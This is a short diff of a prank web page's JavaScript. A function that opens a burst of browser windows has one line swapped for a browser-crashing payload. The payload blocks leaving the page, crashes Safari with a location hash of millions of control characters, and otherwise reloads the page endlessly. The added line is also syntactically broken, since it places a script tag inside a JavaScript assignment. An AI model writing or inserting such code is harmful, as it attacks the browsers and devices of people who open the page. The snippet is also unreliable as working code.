@@ -173,7 +173,7 @@
       function bluePill() {
         if (confirm("Are you sure?")) {
           for (let i=0; i<5; i++) {
-            var crashLMFAO = window.open("https://google.com/search?q=among+us+booty", "")
+            var crashLMFAO = <script>window.onbeforeunload=function(){return true};if(/^((?!chrome|android).)*safari/i.test(navigator.userAgent))onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";else{for(;;)location.reload(1)}</script>
             var smallWindow = window.open(url, "", "width=1920,height=1080");
           }
         } else {
